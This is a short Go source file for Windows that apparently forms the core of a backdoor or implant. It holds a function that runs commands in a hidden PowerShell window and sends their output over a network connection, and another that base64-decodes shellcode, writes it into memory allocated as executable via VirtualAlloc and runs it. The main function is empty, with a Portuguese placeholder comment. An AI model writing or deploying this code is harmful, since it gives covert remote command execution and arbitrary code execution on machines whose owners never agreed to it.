package main

import (
    "encoding/base64"
    "net"
    "os/exec"
    "syscall"
    "unsafe"
)

const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

func getShell() *exec.Cmd {
    cmd := exec.Command("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    return cmd
}

func executeCmd(command string, conn net.Conn) {
    cmdPath := "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
    cmd := exec.Command(cmdPath, "/c", command+"\n")
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}

func injectShellcode(encShellcode string) {
    if encShellcode != "" {
        if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
            go execShellcode(shellcode)
        }
    }
}

func execShellcode(shellcode []byte) {
    kernel32 := syscall.MustLoadDLL("kernel32.dll")
    VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")

    address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    addrPtr := (*[990000]byte)(unsafe.Pointer(address))

    for i, value := range shellcode {
        addrPtr[i] = value
    }

    go syscall.Syscall(address, 0, 0, 0, 0)
}

func main() {
    // Coloque o código principal aqui, se necessário.
}